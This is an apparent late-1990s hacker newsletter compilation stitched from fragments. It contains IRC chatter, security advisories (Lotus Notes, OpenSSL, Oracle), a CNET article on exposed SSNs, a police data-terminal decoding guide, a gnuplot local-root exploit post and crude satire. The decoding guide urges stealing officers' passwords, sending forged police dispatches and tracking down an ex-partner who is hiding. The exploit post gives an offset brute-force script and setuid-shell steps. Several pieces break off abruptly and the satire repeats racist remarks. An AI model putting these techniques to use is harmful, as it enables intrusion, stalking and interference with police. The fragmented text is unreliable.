       [chemmy] CUZ EYE AM A SCRIPT KIDDIE
       [^Dreamer] you can put it no solarz.net/hrc
       [chemmy] Okay
       [chemmy] We will
       [Debris] it will be released on goat first
       [^Dreamer] alright then

       [chemmy] Shut up deb you aint c0ding it
       [chemmy] =)
       [chemmy] Dreamer how old are you?
       [^Dreamer] what will this prog do?
       [Debris] im gunna code something better thab it
       [chemmy] Debris, lol
       [Debris] itll will auto phf

       [chemmy] And auto remote exploit it
       [chemmy] Tested on linux for now
       [^Dreamer] sounds good for lazy ppl
       [Debris] tested?
       [Debris] ahaha
       [Debris] it cant even connect yet
       [chemmy] No, sounds good for script kiddies
       [Debris] duh whatsa socket
       [chemmy] Debris, DID I SAY IT WAS FINISHED?
       [Debris] YES
       [chemmy] NO

         with the focus on actual system design and implementation, rather
         than theory. A major goal of the symposium is to encourage and
         enable the Internet community to apply, deploy, and advance the
         state of available security technology.  The proceedings of the
         symposium will be published by the Internet Society.
       
       
         Submissions are solicited for, but are not limited to, the
         following topics:
       
       
         * Secure Electronic Commerce, e.g., payment, barter, EDI,
           notarization/timestamping, endorsement and licensing.
         * Intellectual Property Protection: protocols, schemas,

 28.0  Billionaires social security numbers listed on net (Yes Gates is here too)
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
     SEC still listing Social Security IDs 
     By Courtney Macavinta
     Staff Writer, CNET News.com
     March 23, 1999, 4:00 a.m. PT 

     The Social Security numbers of many billionaire executives, including Bill Gates, are still listed on the Internet nearly
     two years after the Securities and Exchange Commission ceased collecting them on certain public forms.

     High-tech moguls have voluntarily included their Social Security numbers in filings documenting their stock ownership that were
     later made freely available on the SEC's Web site, as CNET News.com reported in 1997.

     Fearing that the Net made it too easy to exploit personal information, the SEC revised its rules in June 1997 and said it would no
     longer accept Social Security numbers on those forms. Nonetheless, News.com found old filings--and in some cases documents
     filed after the rule change--that still include the numbers of corporate officers at public companies.

     If the nine-digit numbers fall into the wrong hands, they can be used to obtain such information as current and previous
     addresses, employment histories, or credit reports--which, in turn, can unlock other private data such as bank account numbers.

     In addition to Microsoft's chairman Gates and cofounder Paul Allen, Intel cofounder Gordon Moore and Gateway founder Ted Waitt
     are among the members of the billionaire club whose Social Security numbers remain easily accessible through the SEC's
     EDGAR database. The Social Security numbers of Gates, Allen, and Moore were found on forms filed before the summer of 1997,
     but Waitt's number was accepted on a February 1998 filing, after the SEC changed its policy.

     Social Security numbers were created to track earnings and Social Security benefits. But the unique numbers are now used for
     much more, leading privacy organizations to argue that the SEC has a moral obligation to stop publishing them on the Net.

     "The SSN is the way that everybody's financial records are kept together," said Jodie Beebe, a spokesman for the Privacy Rights
     Clearinghouse.

     "If somebody gets a copy of your SSN, they can get utilities hooked up, rack up several credit cards, establish employment--and
     your credit report can be ruined," she added. "Identity theft can wreak havoc in your life."

     Microsoft would not comment about the exposure of Gates's Social Security number, though privacy concerns are nothing new to
     the company. The software giant and Intel--its chipmaking partner in the Wintel PC juggernaut--found themselves at the center of
     recent computer privacy concerns when it was revealed that their products could be used to track Net users' activities.

     In fact, anxiety over the increasing loss of privacy in the information age is at an all-time high, with many lawmakers and
     consumer advocates calling for industry and government to more closely guard personally identifiable information, which is
     solicited by Web sites, compiled by database creators or resold in digital format.

     The SEC is also worried about inadvertently playing a part in identity theft or other privacy breaches.

     "With the growth of the EDGAR database, and its availability to millions of viewers on the commission's Web site, the
     commission is concerned that these numbers are too readily available," the SEC stated in its June 1997 rule change. "The
     usefulness of Social Security numbers filers voluntarily provide on these forms is outweighed by the risk of misuse created by the
     disclosure of those numbers."

     Still, the SEC has no plans to remove documents from its online archive that include the numbers, spokesman John Heine said
     yesterday. "We can't alter those forms. They are a matter of public record," he said.

 29.0 The Doghouse -- Motorola's MDC-4800 Police Data Terminal
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      From Cryptogram 
      
      I'd grab this software before it becomes too well known and pulled from
      the site ... - Ed
      
       
      There's a Windows program that decodes the police car mobile data terminal
      transmissions.  If you thought listening in on police radio frequencies was
      interesting, you should see what comes over on those data transcripts.
       
       
      Motorola's "encryption" wasn't designed for privacy, it's more like a
      checksum for transmission integrity. Basically, it's XOR.
       
       
      The software is free, although there is this helpful notice on the Web
      site:  "Decoding MDT transmissions may be illegal in some countries, you
      may want to check the laws for your country before using this program."
       
       
      http://www.geocities.com/ResearchTriangle/Facility/7646/
      
      From the site;
      
      How to decode the MDC 4800 Protocol
      
      Greetings one and all,

     Have you ever lusted to decode Mobile Data Terminal (MDT)
       tranmissions? Have you ever wanted to see the same NCIC and motor
       vehicle information that law enforcement officers see? Have you ever
       wanted to see what officers send to each other over "private" channels?
       And all this with an interface you can build with only a few dollars
       worth of parts from your local radio shack?
       
            If so this posting might be your rendevous with destiny. The tail
       end of this posting includes the source code of a program that decodes
       and displays MDT messages. It stores roughly 30k of messages in a buffer
       and then writes the whole buffer to a file called "data.dat" before
       terminating. The program may be interrupted at any time by pressing any
       key (don't use control-c) at which point it writes the partially filled
       buffer to "data.dat". This program only works for systems built by
       Motorola using the MDC4800 tranmission protocol. This accounts for a
       large fraction of public service MDT systems as well other private
       systems.
       
            The existence of this program is ample evidence that Motorola has
       misrepresented its MDT systems when it marketed them as a secure means
       of communcications. The interested reader will soon discover that these
       systems do not use any form of encryption. Security concerns instead
       have been dealt with by using a code. "And what might this code be
       called?" asks the reader. The code turns out to be plain ASCII. What
       follows is a brief description of how the program and the MDC4800
       protocol work. If you don't understand something go to your local
       library and check out a telecommunications theory book.
       
            1. The raw transmission rate is 4800 baud. The program's interrupt
       service routine simply keeps track of the time between transitions. If
       you're receiving a perfect signal this will be some multiple of 1/4800
       seconds which would then give you how many bits were high or low. Since
       this is not the best of all possible worlds the program instead does the
       following: transitions are used to synchronize a bit clock. One only
       samples whenever this clock is in the middle of the bit to produce the
       raw data stream. This greatly reduces jitter effects.
       
            2. Whenever a tranmitter keys up the MDC4800 protocol calls for bit
        synchronization (a sequence of 1010101010101010....). In the program
        this will result in receive bit clock synchronization. There is no need
        to specifically look for the bit sync.
       
           3. Look for frame synchronization in raw bit stream so that data
       frames can be broken apart. Frame synchronization consists of a 40 bit
       sequence : 0000011100001001001010100100010001101111. If this sequence is
       detected (or 35 out of 40 bits match up in the program) the system is
       idling and the next 112 bit data block is ignored by the program. If the
       inverted frame sync is detected one immediately knows that 112 bit data
       blocks will follow.
       
           4. Receive the 112 bit data block and undo the bit interleave. This
       means that one must reorder the bits in the following sequence : {0,16,
       32,48,64,80,96,1,17,33,49,65,81,97,2,18,34,...} if the orignal sequence
       were received as {0,1,2,3,4,5,6,7,8,...}.
       
            5. Check the convolutional error correcting code and count the
       number of errors. The error correcting code is rate 1/2 which means we
       will be left with 56 data bytes. The encoder is constructed so that the
       output consists of the original data bits interspersed with error
       correcting code. The generating polynomial used is :
                        1 + X^-1 + X^-5 + X^-6
       Whenever an error is detected a counter is incremented. An attempt is
       made to correct some errors by finding the syndrome and looking for the
       bogus bit.
       
            6. Keep receiving 112 bit data blocks until either a new frame sync
       is found or two consecutive data blocks have an unacceptably large
       number of errors.
       
            7. Each data block consists of six data bytes; the last 8 bits are
       status bits that are simply ignored. The program shows the data in two
       columns - hexadecimal and ASCII. This data is kept in a buffer and is
       written to the file "data.dat" when the program terminates.
       
            8. What the program doesn't do: As a further check on the data
       there can be CRC checks. This varies from protocol to protocol so this
       program does not implement the CRC checks. Nonetheless, it is a
       relatively trivial matter to find the generating polynomial. The
       addresses, block counts, and message ID numbers are also quite easy to
       deduce.
       
       As you can see, there is no encryption. The bit interleave and the error
       correcting coding are there solely to insure the integrity of the ASCII
       data. Since any moron could have figured this stuff out from scratch one
       could argue that MDTs do not use "...modulation parameters intentionally
       witheld from the public". Therefore the Electronic Communications
       Privacy Act may not prohibit receiving MDT tranmissions. However,
       consult your attorney to make sure.
       
            The total disregard for security will no doubt annoy countless
       Motorola customers who were assured that their MDT systems were secure.
       Since Federal law states that NCIC information must be encrypted your
       local law enforcement agency might be forced to spend millions of
       dollars to upgrade to a secure MDT system - much to the delight of
       Motorola and its stockholders. Cynics might conclude that the release of
       a program like this is timed to coincide with the market saturation of
       existing MDT systems.
       
            Also, this program is completely free and it had better stay that
       way. What's to prevent you from adapting this into a kit and selling it
       from classified ads in the back of Nuts and Volts? Nothing. But take a
       look at Motorola's patents sometime. You'll notice that this program
       does things that are covered by a shitload of patents. So any attempt to
       take financial advantage of this situtation will result in utter misery.
       
       
       Please keep the following in mind: this program only works with the
       first serial port (COM1). If your mouse or modem is there too bad. If
       you don't like this rewrite the program.
       
       
       ------------------------------------------------------------------------
       What equipment do I need?
       
       RADIO SCANNER:
       
            A scanner that can receive 850-869 MHz. For those of you who don't
       know, this is the band where most business and public service trunked
       radio systems can be found along with the mobile data terminal
       transmissions. Chances are excellent that if your local authorities have
       a motorola trunked radio system and mobile data terminals that this is
       the frequency band in use. Very rarely will one find mobile data
       terminals in other frequency bands.
       
            Now for the fun part - your scanner should probably be modified to
       allow you to tap off directly from the discriminator output. If you wait
       until the signal has gone through the radio's internal audio filtering
       the waveform will likely be too heavily distorted to be decoded. This is
       exactly the same problem that our friends who like to decode pager
       transmissions run into - some of them have claimed they can only decode
       512 baud pager messages using the earphone output of their scanner.
       These mobile data terminal messages are 4800 baud so I don't think you
       have a snowball's chance in hell without using the discriminator output.
       If you don't know where to begin modifying your scanner you might want
       to ask those who monitor pagers how to get the discriminator output for
       your particular radio.
       
       
       COMPUTER/SCANNER INTERFACE
       
             Those of you who have already built your interface for decoding
       pager messages should be able to use that interface without any further
       ado. For those starting from scratch - you might want to check out
       packages intended for pager decoding such as PD203 and the interfaces
       they describe. The following excerpt gives an example of a decoder that
       should work just fine (lifted out of the PD203 POCSAG pager decoder
       shareware documentation):

       This needs a mod - It is far to deaf as this. Remove the 10k resistor and
       replace it with a 470 ohm preset and 560 ohm fixed in series. Audio level is

       If I were building this circuit I would strongly suggest tying the
       non-inverting (+) input of the op-amp to ground since you are working
       directly with the discriminator output and don't need a Schmitt trigger.
       All these parts or equivalents are easily available (even at your local
       Radio Shack which stocks the finest collection of components that have
       failed the manufacturer's quality control checks and supported by a
       sales staff that's always got the wrong answers to your questions).
       
       Also: DO NOT use the RI (ring indicator) as an input to the computer.
       
       -------------------------------------------------------------------------
       
       How do I check things?
       
            As a first step, I would get a package such as PD203 and use it to
       decode a few pages. If you can get that working you know that that your
       interface circuit is functioning correctly.
       
            If you are in a reasonably sized town you might be part of the
       ardis network. The ardis network is a nationwide commercial mobile data
       terminal network where one can send/receive E-mail messages from one's
       portable computer. It has been exclusively assigned the frequency of
       855.8375 MHz. Therefore, if you can hear digital bursts on this
       frequency you are basically guarranteed that these are MDC4800 type
       messages. You should be able to get stuff popping up on your screen
       although a lot of the messages will not be plain english.
       
            If your interface works but you can't seem to get any messages on
       the screen for a channel you know is a Motorola MDT system then it might
       be possible that your scanner/interface is putting out data with the
       polarity reversed. To check for this run the program with a command line
       arguement. When it runs you should an initial "Polarity reversed"
       message and hopefully then things will work out for you.
       
            Other than that: if this program doesn't work pester someone else
       who has got it working. Don't bother pestering the author(s) of this
       posting; the shit(s) aka "she/he/it (s)" are afraid of a thousand
       lawyers from Motorola descending like fleas to infest their pubic hair
       and accordingly have decided to remain forever anonymous. No doubt
       someone on the usenet who sees this post will know what to do with this
       program and also hopefully rewrite into a more user friendly form. When
       you do please don't forget to release the source code.
       
       -------------------------------------------------------------------------
       
       Future projects/nightmares you might want to think about:
       
            Certain MDT systems embed formatting information in the text in the
       form of ESC plus [ plus a few more bytes. Someone might want to decode
       these on the fly and format the output so it looks exactly the same way
       as the user sees it.
       
            Make it so that this program works with com ports other than COM1.
       
            Make it user friendly?
       
            Enlarge the data buffer from the current 30k.
       
            Give the output data file an unique name each time the program is
       run instead of "data.dat".
       
            How about sorting through the past traffic so that you only see
       traffic to a specified user?
       
            The program does not cut data blocks off in the display but it
       might add an extra one or two (which will display as all zeroes).
       Someone might want to make all those zeroes be shown as blanks instead.
       
            Write some real instructions.
       
       
       Now the more ambitous stuff:
       
            Are you half-way competent with RF engineering? Then listen in to
       the tranmissions from the mobile units back to the base station. That
       way you get everyone's password and user IDs as they log on to the MDT
       system. By this point you will no doubt have been able to figure out all
       of the appropriate communications protocols so you should think about
       getting your own transmitter up and running along with the necessary
       program modifications so that you can transmit MDT messages. The
       required transmitter can be very simple - for example, those masocists
       who want to start from scratch might want to special order an
       appropriate crystal (pulling the frequency with the computer's tranmit
       signal), building a frequency multiplier chain, and adding a one watt RF
       amplifier to top it all off (see the appropriate ARRL publications for
       more information on radio techniques). Now you can log in and look at
       the criminal records and motor vehicle information on anybody you can
       think of. Find out what your neigbors are hiding. Find out who that
       asshole was that cut you off downtown. Find out where your former
       girl/boy friend is trying to hide from you. And on and on...
            Those with simpler tastes might want to simply transmit at the base
       station's frequency to any nearby MDT terminal - now you too can
       dispatch your local law enforcement agencies at the touch of your
       fingers!!! See your tax dollars at work tearing apart every seam of your
       neighbor's house. Or create strife and dissension in your local law
       enforcement agency as more and more officers come out of the closet
       using their MDTs trying to pick up fellow officers.
       
            There are municipalities that have put GPS receivers on all of
       their vehicles. Should it happen that the information is sent back over
       one of these networks you could have your computer give you a real-time
       map showing the position of every vehicle and how far away they are from
       you.
       
            Extend your knowledge to other data networks. Here you will want to
       look at the RAM mobile data network. It uses the MOBITEX protocol which
       is really easy to find information on. Since it is an 8 kilobaud GMSK
       signal there is a decent chance that you can use the interface described
       here. This transmission mode demmands much more from your equipment than
       MDT tranmissions. At the very least you must be much more careful to
       make sure you have adequate low frequency response. Despite this it is
       possible to receive and decode MOBITEX transmissions with a simple
       op-amp circuit! This just goes to show you what drivelling bullshit
       RAM's homepage is filled with - they explain in great detail how hackers
       will never be able to intercept user's radio tranmissions (incidentally
       explaining how to decode their tranmissions). The necessary program will
       be the proverbial exercise left for the reader. For better performance
       buy a dedicated MOBITEX modem chip and hook it up to your computer.
       
       -----------------------------------------------------------------------
       
       A few words about the program:
       
            Remember - you must have your decoder hooked up to COM1. The RTS
       line will be positive and the DTR line negative but if you built the
       decoder with a bridge rectifier you really don't have to worry about
       their polarity. Stop the program by punching any key; don't use
       control-c or control-break!
       
            If you must reverse polarity run the program with any command line
       arguement (example: type in "mdt x" at the command line if your program
       is mdt.exe). You should then see the "Polarity Reversed." message pop up
       and hopefully things will then work.
       
            As far as compiling this - save the latter portion of this posting
       (the program listing) and feed it to a C compiler. Pretty much any C
       compiler from Borland should work. If you (Heaven Forbid) use a
       Microsoft C compiler you might need to rename some calls such as
       outport. Follow any special instructions for programs using their own
       interrupt service routines. This program is not object oriented. It also
       does not want anything whatsoever to do with Windows. Please don't even
       think about running this program under Windows. Finally, here it is:

                         Impact: Encrypted mail sent from the Notes client may

       Synopsis
       --------
       
       
       When performing network analysis experiments with the Lotus Notes Client
       a very subtle bug was discovered that may lead to inadvertent revelation of
       confidential information.
       
       
       Usually the Notes client sends at least two copies of a newly created mail.
       One copy is sent to the recipient, the other is stored in the "Sent Mail"
       folder of the sender's Notes server.
       
       
       If an encrypted mail is to be sent and the conditions for this bug are
       met, the copy for the sender's "Sent Mail" folder is not encrypted. As a
       result, the message is sent to the Notes server in the clear and stored
       on the Notes server unencrypted.
       
       
       The message may thus be intercepted and read by analyzing the network
       traffic between the sender's Notes client and the server or by directly
       accessing the "Sent Mail" folder on the Notes server.
       
       
       The user is not given any warning or notification about the problem, and
       the problem causes almost no noticable side effects. As a result, if a
       user is affected by the problem, this will probably remain unnoticed.
       
       
       Lotus is currently working on the problem, a detailed analysis and official
       fixes may be available soon. Once this is available, it should be preferred
       to the workaround presented in this document.
       
       
       
       Details
       -------
       
       
       The problem seems to result from an inadequate check condition in the
       client code.
       
       
       Traditionally Windows, DOS and OS/2 use the backslash character ('\') as
       a path separator, whereas Unix systems use the slash ('/') for this
       purpose. Applications that deal with both styles need to be aware of the
       problem and have to take care of paths passed to applications or services
       on other systems.
       
       
       The user's database usually is located on a remote server. Though Notes
       clients are normally Windows style systems, the servers may either run
       Windows, OS/2 or Unix as the server operating system. Thus Notes needs to
       take care of proper translation of file paths as files are accessed on
       various platforms.
       
       
       Notes accesses databases by specifying the server and the path to
       the database. In order to open a user's database in the first place, the
       user needs to enter the correct path to the database or traverse the
       directory tree on the server. When the database has been opened, Notes
       remembers the path to the database for subsequent access to this database.
       
       
       Internally the Notes client seems to store the path to the database using
       the client operating system file naming conventions. In particular, on
       Windows or OS/2 platforms, Notes uses Backslash characters ('\') as path
       separators.
       
       
       The current Notes environment settings may be changed by opening the
       environment document (File/Mobile/Edit current environment). In the second
       entry of the section "Mail" the path to the mail file can be changed by
       the user.
       
       
       Notes uses this entry for various purposes. One of these is the periodical
       check for new mail or agenda events. (If the user specifies an incorrect
       path here, mail notification does not work any longer.)
       
       
       To address the backslash-slash problem, Notes seems to translate
       any path entered by the user into the proper representation needed for
       accessing the service required. Apparently it does not matter at all if
       paths are entered with slashes or backslashes as path separators. The GUI
       dialogs accept any spelling as well as the environment document mentioned
       above.
       
       
       However, if for some reason the environment document of a Windows style
       client specifies the mail file with *slashes* as a path separator (like
       e. g. mail/users/user.nsf instead of mail\users\user.nsf) Notes does
       a proper translation of the path and almost all functions will work as
       expected.
       
       
       Except for one side effect: Notes does not recognize the specified
       database as the user's mail database. Probably a simple string compare
       between the currently opened mail database and the database path of the
       environment document is performed, and this comparison fails because of
       the different representation of paths.
       
       
       The resulting effect: if an encrypted mail is to be sent and the
       environment document does contain a mail database path with 'incorrect'
       path separators as seen from the client OS view, the mail copy for the
       user's "Sent Mail" folder is being sent to the user's database in the
       plain and stored unencrypted on the server. The contents of the message
       may be read in plain text by sniffing on the network or by directly
       accessing the notes database.
       
       
       The behaviour described can be reproduced with almost any Notes client
       and server combination. Even if both the server and client use the
       same operating system, it is still possible to enter the mail path
       separated with slash characters. The Notes client will behave as described
       above.
       
       
       
       Detection
       ---------
       
       
       - compose a new mail message
       - address this message to some other user
       - using the mail properties dialog enable encryption for this individual
         message
       - send message
       - change to the "Sent Mail" folder of your mail database
       - right-click on the sent message once
       - open the properties dialog for this document
       - choose "fields" in the document properties
       - check existence of the fields "$Seal", "$SealData" and "Body"
       
       
       Under normal circumstances the "$Seal"/"$SealData" and "Body" fields are
       mutually exclusive.
       
       
       The existence of "$Seal" and "$SealData" usually indicate that the message
       was properly encrypted.
       
       
       If the field "Body" exists, this message is stored in the plain on the
       server and was transferred unencrypted across the network.
       
       
       
       Alternatively the network traffic can be analyzed while sending an
       encrypted mail. This is how the bug was discovered in the first place.
       
       
       
       Workaround
       ----------
       
       
       The workaround described here may be an incomplete fix for the problem;
       the problem may be triggered by other conditions as well. As Lotus is
       actively investigating on the problem, the solution presented by Lotus
       may be more general and should be preferred once it is available.
       
       
       
       First method:
       
       
       Open your environment document. The path to the database must *not*
       contain any path separator characters that are not natively used by
       the client operating system.
       
       
       When using a Windows or OS/2 environment, the path must only contain
       backslash '\' characters.
       
       
       
       Example:
       
       
       Mail File: mail\path\to\user.nsf    * OK *
       
       
       Mail File: mail/path/to/user.nsf    * DANGER! *
       
       
       A client restart is required to make the changes effective.
       
       
       
       Second method:
       
       
       In your global preferences check the "Encrypt saved mail" box. Every
       message you send will be encrypted when saving the message to the "Sent
       Mail" folder on the server.
       
       
       
       Use both methods to be sure that mail sent by the client is not sent and
       stored in the clear. Be aware that using the second methond will
       result in encryption of the whole database and that loss of your
       passphrase or Notes ID will effectively cause loss of your mail database
       contents.

               BIG thanks to stran9er for alot of help with part of the shellcode!
               i fear stran9er, but who doesn't? !@$ :)
       
       
               Greets to: #!ADM, el8.org users,
       
       
               To exploit this remotely they need to have a directory you can
               have write privlidges to.. this is the <dir> argument.. you can
               also use this locally by specifying -l <ur login> -p <urpass> with the
               <dir> = your home directory or something..(must begin with '/')
               also alignment arg is how return address  is aligned.. shouldnt need it,
               but if u do it should be between 0 and 3
       
       
               It takes about 10 seconds after "logged in" so be patient.

 32.0  Bugtraq: OpenSSL and SSLeay Advisory
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
       
       OpenSSL and SSLeay Security Alert
                  ---------------------------------


       
       It was recently realised that packages that use SSLeay and OpenSSL may
       suffer from a security problem: under some circumstances, SSL sessions
       can be reused in a different context from their original one. This may
       allow access controls based on client certificates to be bypassed.
       
       
       Unfortunately, before the the problem was fully understood, it was
       discussed on various public lists. The OpenSSL team have therefore
       decided to release an interim version of OpenSSL which addresses the
       problem by disabling session reuse except in limited circumstances
       (see below).
       
       
       A future version will deal with the problem more elegantly by redoing
       verification on reused sessions when necessary.
       
       
       Although this problem is not strictly a defect in OpenSSL, it is
       rather tricky for applications to be coded correctly to avoid the
       problem due to the sketchy nature of SSLeay/OpenSSL documentation. We
       therefore decided to protect applications from within OpenSSL.
       
       
       
       The problem
       -----------
       
       
       SSL sessions include a session ID which allows initial setup to be
       bypassed once a session has been established between a client and
       server. This session ID, when presented by the client, causes the same
       master key to be used as was used on the previous connection, thus
       saving considerable session setup time.
       
       
       When the session is reused in this manner, all access controls based
       on client certificates are bypassed, on the grounds that the original
       session would have made the necessary checks.
       
       
       Unfortunately, the lack of documentation has resulted in the caching
       structures being used in certain applications without appropriate care
       being taken to assure that the cached sessions are only available at
       the appropriate moments.
       
       
       As a result it is sometimes possible for a specially written SSL
       client to fraudulently obtain an SSL connection which requires access
       control by reusing a previous session which had different or no access
       control.
       
       
       The problem affects servers which support session reuse and which have
       multiple virtual hosts served from a single server, where some virtual
       hosts use differing client server verifications. Note that "different"
       includes no verification on some hosts, and verification on others, or
       different CAs for different hosts.
       
       
       In order to exploit this problem carefully written client software
       would need to be written. The attacker would need considerable
       knowledge of the SSL protocol. Standard web browsers will not and
       cannot be made to use SSL in this way.
       
       
       
       Affected software
       -----------------
       
       
       All server software using SSLeay or versions of OpenSSL prior to
       version 0.9.2b that support multiple virtual hosts with different
       client certificate verification may be vulnerable.
       
       
       This includes, but is not limited to:
       
       
       Apache-SSL      http://www.apache-ssl.org/
       mod_ssl         http://www.engelschall.com/sw/mod_ssl/
       Raven           http://www.covalent.net/
       Stronghold      http://www.c2.net/
       
       
       
       The solution
       ------------
       
       
       Download OpenSSL 0.9.2b (see http://www.openssl.org) and build it in
       the usual way.
       
       
       Check the application for updates, and download those, too (NB: this
       step is not necessarily required, the updated library will fix the
       problem). The versions of the applications listed above that you should
       use are:
       
       
       Apache_SSL 1.3.4+1.32
       mod_ssl 2.2.6-1.3.4
       Raven 1.4.0
       Stronghold 2.4.2
       
       
       Rebuild the application (if needed).
       
       
       If you are an application author, you should look in to the use of
       SSL_set_session_id_context(), which can be used to reenable session
       reuse when appropriate.
       
       
       
       Known exploits
       --------------
       
       
       There are no known exploits of this security hole.

       OpenBSD 2.1 Security Advisories
       
       These are the OpenBSD 2.1 advisories. All these problems are solved in OpenBSD 2.2. Some of these problems still exist in other operating systems. (If you are
       running OpenBSD 2.1, we would strongly recommend an upgrade to the newest release, as this patch list only attempts at fixing the most important security
       problems. In particular, OpenBSD 2.2 fixes numerous localhost security problems. Many of those problems were solved in ways which make it hard for us to
       provide patches). 
       
            Sep 15, 1997: Deviant Signals (patch included) 
            Aug 2, 1997: Rfork() system call flaw (patch included) 
            Jun 24, 1997: Procfs flaws (patch included) 
       
       Watching our Security Changes
       
       Since we take a proactive stance with security, we are continually finding and fixing new security problems. Not all of these problems get widely reported because
       (as stated earlier) many of them are not confirmed to be exploitable; many simple bugs we fix do turn out to have security consequences we could not predict. We
       do not have the time resources to make these changes available in the above format.
       
       Thus there are usually minor security fixes in the current source code beyond the previous major OpenBSD release. We make a limited guarantee that these
       problems are of minimal impact and unproven exploitability. If we discover that a problem definitely matters for security, patches will show up here VERY quickly.

           I now know this has been mentioned before, however I've gotten a large
       number of responses from people about Oracle problems similar to this. As a
       first time Oracle installer, I didn't realize the scope of the problem. I
       hope that upon reading this, more people will realize that the Default
       settings under Oracle just aren't secure.
       
       
       Original Post to NTBugtraq:
       
       
           I apologize if this has been mentioned before, however I haven't had any
       time to pursue this issue with any vigor.
       
       
           I recently installed Oracle 8.0.3 Enterprise Edition on an NT 4.0
       Workstation and I noticed a particular feature within Oracle Database
       Assistant v1.0 that might be of some interest/concern.
       
       
           During the creation of an Oracle database, the Database Assistant lets you
       create either a custom or typical(default) database. If you select "custom"
       database, you must enter a master password that controls the administrative
       features in the database. If you select "typical", this password defaults to
       'oracle'.
       
       
           As the database is created, the Server Manager reports all activities to a
       log file. This log file, "\orant\database\spoolmain.log", even logs the
       master password as it connects to the server to continue the setup. The
       entry is as follows:
       
       
       Echo                            ON
       SVRMGR> connect INTERNAL/MYPASSWORD
       Connected.
       
       
           Not only is this password in plaintext, but the file has permissions that
       enable anyone to view it. (owned by Admins, but full control for everyone)
       I believe the setup informs you that the file exists and should be checked
       for errors, but I didn't find any other reference to it in the
       documentation.
       
       
           The log does get overwritten each time you create a new database, however
       that just limits the number of plaintext passwords to one. Once again, I
       haven't had time to look into this, but it seems like a potential problem
       worth mentioning.

       Subject:      Linux /usr/bin/gnuplot overflow 
       To: BUGTRAQ@netspace.org 
       
       
       greetings,
       
       
       INFO:
       
       
       There is a local root comprimise in /usr/bin/gnuplot version Linux version 3.5
       (pre 3.6) patchlevel beta 336.  gnuplot is shipped to install suidroot on
       SuSE 5.2 and maybe others.  The exploit starts as a simple $HOME buffer
       overflow, but much like zgv holes in the past, it drops root privs before the
       overflow occurs.  However, as Nergal describes at
       http://www.geek-girl.com/bugtraq/1998_4/0148.html, svgalib needs write access
       to /dev/mem, and we can therefore regain root privs by overwriting our uid.
       
       
       the offending code appears in plot.c where we see:
       
       
           char home[80];
       ...
           char *tmp_home=getenv(HOME);
       ...
           strcpy(home,tmp_home);
       
       
       EXPLOIT:
       
       
       xnec_plot.c
       ---snip---
       /*
       gnuplot Linux x86 exploit from xnec
       tested on gnuplot Linux version 3.5 (pre 3.6) patchlevel beta 336/SuSE 5.2
       gnuplot ships suidroot by default in SuSE 5.2, maybe others
       
       
       gcc -o xnec_plot xnec_plot.c
       ./xnec_plot <bufsiz> <offset>
       
       
       The buffer we're overflowing is only 80 bytes, so we're going to have to
       get our settings just so.  If you don't feel like typing in command line
       offsets and bufsizes, make a little shell script:
       ---
       #! /bin/bash
       bufsiz=110
       offset=0
       
       
       while [ $offset -lt 500 ]; do
         ./xnec_plot $bufsiz $offset
         offset=`expr $offset + 10`
       done
       ---
       since gnuplot drops root privs after it inits your svga, we can't just exec
       /bin/sh, we'll need to use the technique of replacing our saved uid
       in /dev/mem with '0', then execing whatever we please.  We do this by compiling
       Nergal's program, mem.c and putting the output file in /tmp/xp, as in
       gcc -o /tmp/xp mem.c.  Nergal's program will then make /tmp/sh suidroot,
       so don't forget to cp /bin/sh /tmp/sh.  You will also have to change
       line 32 to the correct address of kstat, which can be obtained by doing
       strings /proc/ksyms | grep kstat.
       
       
       Since I can see absolutely no reason for gnuplot to be suidroot, the best
       fix is chmod -s /usr/bin/gnuplot.

       FIX:
       
       
       Since I see absolutely no good reason why gnuplot should be suidroot (who,
       besides root, is going to run it, anyway?), I would recommend a simple
       chmod -s /usr/bin/gnuplot.  If you absolutely insist on suid, here's the patch:
       
       
       --- plot.c.old  Fri Mar  5 03:17:59 1999

            if(tmp_home) {
       -       strcpy(home,tmp_home);
       +       strncpy(home,tmp_home,(sizeof(home) - 1));
               if( strlen(home) ) p = &home[strlen(home)-1];
               else               p = home;
       #if defined(MSDOS) || defined(ATARI) || defined( OS2 ) || defined(_Windows) ||
       defined(DOS386)
       
       
       However, this by no means was a comprehensive security audit of gnuplot, so
       there may very well be a dozen other problems I've not fixed.

      AntiOnline Saga Continues 
      Contributed by siko
      Tuesday - March 23, 1999. 04:33AM GMT 

          Late last night, an expert panel of Innerpulse analysts reading through the
      new AntiOnline mail bag were able to make several key insights as to the
      organization and operation of AntiOnline. 

      Dan Martin, who was obviously leaked some inside information from
      someone high up in the AntiOnline heirarchy, let the world know about the
      disasters over at AntiOnline. Not only is the lobby messy, but AntiOnline gets
      their news from what market experts are calling.. Innerpulse.com.

      "I used the investment money to support my cocaine habit", boasted JP just
      before he blasted Mexicans for being what he thinks as inferior to himself.
      Other sections of the Mail Bag included racist remarks aimed at Brazilians,
      Chinese, and Arabs (we can only assume he was knocking Arabs with the
      bombing cracks). 

      "This is an outrage. How could he tear up so many different different people.
      And worst of all he forgot to tear up the Japanese.", said a respected member
      of the Internet community.

      Also, Innerpulse CEO, Marvin Speling, has decided to contact the resident
      Innerpulse Legal staff since it seems AntiOnline is what is legally termed as
      "Crampin my style".

       New Study Results: Only Idle on IRC 
       Contributed by siko
       Sunday - March 21, 1999. 09:12PM GMT 

        Innerpulse.com spent time on Efnet and Undernet and picked up a thing or
       two. Innerpulse has now learned that just because someone is idle for a week
       on IRC doesn't mean your news page should idle for a week, as Innerpulse
       Media Ltd. has concluded in a comprehensive study early this morning.

       "Sometimes I idle on IRC for 2, 3 days at a time. The idea of idling elsewhere
       on the Internet is new... ", commented an unknown Undernet IRC patron.
       "But I guess it could be kind of elite..".

       Among other areas explored by the small panel of hackers who tested internet
       waters for over a week as a supplement to Gateway's study included IRC
       relationships and an inside look at why hackers hack.

       Innerpulse head janitor, Bobo Jensen, commented on his IRC relationship and
       how it all fit in with his wildly successful life. Innerpulse Analyst, Mark
       Winters, speculated on the future of online relationships: "We all know bitches
       aint shit. What do you want me to say?" 


       AOL's security compromised

       Sunday - March 21, 1999. 08:01PM UTC 

            An 18-year-old high school dropout has been charged with computer
       tampering after hacking into the internal computers of America Online and
